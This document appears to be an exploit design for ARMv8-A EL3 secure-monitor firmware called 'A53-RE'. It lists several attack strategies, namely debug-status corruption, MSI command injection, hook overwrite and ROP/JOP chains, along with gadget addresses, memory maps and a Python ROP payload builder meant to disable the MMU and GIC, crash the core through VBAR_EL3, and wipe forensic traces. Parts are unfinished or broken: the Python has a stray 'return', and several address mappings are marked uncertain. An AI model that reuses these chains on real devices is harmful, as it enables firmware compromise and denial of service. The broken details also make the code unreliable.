# A53-RE: Chain Strategy — Exploitation Design

## Prerequisites

This strategy assumes **arbitrary code execution at EL3** has been achieved through
a separate vulnerability (e.g., SMC handler bug, DMA attack, JTAG, or physical access).

EL3 is the highest privilege level on ARMv8-A. From EL3, all system registers, all
MMIO, and all physical memory are accessible. No privilege escalation is needed.

---

## Strategy 1: ROP Chain via Debug Status Corruption

### Entry Point
The EL3 exception vector table saves x0/x1 to `mp4_debug_status_t.mds_gpr[0-1]`
on every exception entry. If an attacker can write to the debug status structure
(at 0xEC000000 or 0xEC100000), they can control the values that the SVC handler
(`svc_EL3`) uses.

### Step 1: Corrupt debug_status GPRs
Write controlled values to:
- `mds_gpr[0]` @ 0xEC000010 → becomes x0 for SVC handler
- `mds_gpr[1]` @ 0xEC000018 → becomes x1 for SVC handler
- `mds_spsr`   @ 0xEC000108 → SPSR for eret (target EL)
- `mds_elr`    @ 0xEC000100 → ELR for eret (target PC)

### Step 2: Trigger SVC #0x152
From EL1 or EL0, execute `svc #0x152`. This traps to EL3 vector table,
which saves registers to debug_status, then calls `svc_EL3(ESR_EL1, debug_status)`.

The handler calls `write_EL3(mds_gpr[0], mds_gpr[1])` — with our controlled values.

### Step 3: write_EL3 as write primitive
`write_EL3` (at 0x0010bdd8) writes `msg` of `len` bytes using `putchar_pericom`
or `putchar_cp`. This is a byte-at-a-time write, not useful for memory corruption.

**However**: The SVC handler writes the return value to `status->mds_gpr[0]`.
If we can influence `write_EL3`'s return value...

### Alternative: Direct debug_status → eret chain
Instead of using SVC, directly set:
- `mds_gpr[2-30]` → desired register values
- `mds_spsr` → SPSR_EL3 with desired mode (EL3h)
- Set VBAR_EL3 to a trampoline address
- Trigger any exception (timer, IRQ, SError)

The vector handler saves x0/x1 to debug_status, then branches to `_el3_serror`,
which eventually does:
```asm
ldr x0, [x0, #8]          ; mds_vector
ldr x1, [x0, #0x10]       ; mds_gpr[0]
...
eret
```

But the epilogue RESTORES GPRs FROM THE STACK, not from debug_status! So this
approach won't directly give us controlled GPRs at eret.

**Correct approach**: Pivot SP into debug_status structure, then the epilogue
LDP instructions read our controlled GPRs from the debug_status memory.

---

## Strategy 2: MSI Ring Buffer → ROP Chain

### Entry Point
The MSI ring buffers are at known MMIO addresses accessible from EL3:
- C2P Command: 0x030f6000 (readable by core 0)
- P2C Command: 0x03010500 (writable by core 0)

### Step 1: Inject fake MSI interrupt
Core 0 writes a crafted command to P2C and triggers MSI. Core 1 receives the
interrupt via GIC, reads C2P command, and processes it.

### Step 2: Command dispatch
The interrupt handler `el3_serror_handler` checks:
```c
if (vector == 0x480 || vector == 0x280) {
    v = gic_read_GICC_IAR();
    if (v == 0x53 || v == 0x4e) {
        command = msi_read_c2p_command(cpu);
        bits = msi_read_c2p_arg1(cpu);
        if (command >> 12 == 0x20211) {
            deci_target_mp4_intr(bits);
        }
    }
    msi_write_c2p_ack(cpu, command);
}
```

If command == 0x20211000, it calls `deci_target_mp4_intr(bits)`. This function
processes DECI shared memory interrupts — it reads from shared memory structures
that may be attacker-controlled.

---

## Strategy 3: JOP Chain via Function Pointer Overwrite

### Entry Point
The `dev_context_t` structure contains function pointers writable from EL3:
- `dc_putchar_low_hook` — called on every printf/putchar

### Step 1: Overwrite putchar hook
```c
dev_context_t *dc = (dev_context_t *)TPIDR_EL3_value;
dc->dc_putchar_low_hook = (void *)gadget_chain_start;
```

### Step 2: Trigger via printf_low
Any call to `printf_low(...)` will call our gadget chain with argument = first
character of format string.

### JOP Gadget Sequence
```
G1: str x0, [x1]           // MEM-STR: store character to target address
    add x1, x1, #4         // advance target pointer
    ret                    // pop next gadget from our controlled stack
```

### Limitation
`putchar_low` receives a single `int` argument (the character). To pass multiple
arguments, we'd need to pre-load registers before the JOP trigger, or use a
stack-pivot gadget as the first JOP target.

---

## Strategy 4: Full EL3 ROP Chain (Recommended)

### Phase 0: Setup
1. **Find controlled memory buffer**: Debug status structure or MSI scratch registers
2. **Write ROP chain** to that buffer
3. **Pivot SP** to the buffer using SP-PIVOT-1 (requires controlling x1 before eret)

### Phase 1: Disable MMU
```
G1: 0x001183a0  mov w0, wzr            ; x0 = 0
G2: (find msr sctlr_el3, x0)           ; disable MMU
G3: 0x00107930  eret                    ; (optional, if chain continues)
```
**Note**: After MMU disable, all subsequent gadget addresses must be PHYSICAL
addresses, not virtual. Need to know the VA→PA mapping.

### Phase 2: Disable GIC
```
G4: MRS CBAR_EL1 → x0
G5: ADD x0, x0, #0x1000               ; GICD base
G6: STR wzr, [x0]                      ; disable GICD_CTLR
G7: ADD x0, x0, #0x1000               ; GICC base
G8: STR wzr, [x0]                      ; disable GICC_CTLR
```

### Phase 3: Clear SCR
```
G9: MSR scr_el3, xzr
```

### Phase 4: Infinite loop (physical address)
```
G10: B .                                ; hang at known physical address
```

### Phase 5: Anti-forensics
```
G11: MSR pmcr_el0, xzr                  ; disable PMU
G12: STR xzr, [debug_status_base]       ; corrupt magic1
G13: STR xzr, [debug_status_base+8]     ; corrupt magic2
```

---

## Strategy 5: Single-Gadget Disable

The most elegant attack: use the **MSR VBAR_EL3 gadget** to redirect exception
vectors to an unmapped or attacker-controlled address.

### Chain
```
1. LDR x0, =0xDEADBEEF                ; invalid VBAR address
2. B 0x000020e8                        ; msr vbar_el3, x0
3. (timer interrupt fires ~1ms later)
4. CPU tries to fetch from 0xDEADBEEF
5. Translation fault → exception → fetch from VBAR (still 0xDEADBEEF)
6. Double fault → unrecoverable
```

This works because after setting VBAR_EL3 to invalid, the next exception
(guaranteed by the GIC timer) creates a recursive fault loop that the CPU
cannot recover from.

---

## Memory Layout (Critical for Chain Construction)

### SRAM (Identity Mapped at EL3 boot)
| Address | Content |
|---------|---------|
| 0x00000000 | Reset vector |
| 0x00002000 | Reset vector (continued) |
| 0x00003000 | Core 0 stack (0x1000 bytes) |
| 0x00004000 | Core 1 stack (0x1000 bytes) |
| 0x00100000 | EL3 text (virtual == physical?) |
| 0x00126000 | EL3 Core 0 stack (0x2000 bytes) |
| 0x00128000 | EL3 Core 1 stack (0x2000 bytes) |

### DRAM (Physical address 0x88000000+)
| Address | Content |
|---------|---------|
| 0x88000C00 | Main parameter block (mm4p) |
| 0x88000000 | DRAM start |
| 0xEC000000 | Debug Status Core 0 |

### VA→PA Mapping
The MMU is configured during boot with phase1/phase2a/phase2b. The mapping is:
- VA 0x00000000-0x00010000 → PA 0x00100000 (SRAM, read-only after boot?)
- VA 0x00100000-0x00117000 → PA 0x88000000+??
- VA 0x60000000-0x62000000 → PA 0x88200000+

Need to verify the exact VA→PA mapping. If VA==PA for the chain region, no
adjustment needed after MMU disable.

---

## Chain Payload Template

```python
#!/usr/bin/env python3
"""ROP chain payload builder for A53-RE disable exploit."""

import struct

def p64(x): return struct.pack('<Q', x)

# === Gadget addresses (virtual, from EL3 text) ===
G_MOV_W0_WZR        = 0x001183a0   # mov w0, wzr
G_RET_CLEAN          = 0x001183ac   # ldp x29,x30,[sp],#0x10; ret
G_ERET               = 0x00107930   # eret
G_STR_WZR_X0_18      = 0x00118330   # str xzr, [x0, #0x18]
G_MSR_VBAR_EL3_X0    = 0x000020e8   # msr vbar_el3, x0
G_MRS_TPIDR_EL3_X0   = 0x001078bc   # mrs x0, tpidr_el3

# === Build chain ===
chain = b''

# Phase 1: Get dev_context pointer
chain += p64(G_MRS_TPIDR_EL3_X0)

# Phase 2: Disable MMU
chain += p64(G_MOV_W0_WZR)

# Phase 3: Redirect VBAR to crash
chain += p64(0xDEADBEEF00000000)    # x0 = invalid VBAR
chain += p64(G_RET_CLEAN)           # adjust x30 for next call
chain += p64(G_MSR_VBAR_EL3_X0)     # msr vbar_el3, x0

# Phase 4: Wait for timer interrupt → crash
chain += p64(G_ERET)                # return to wait

return chain
```
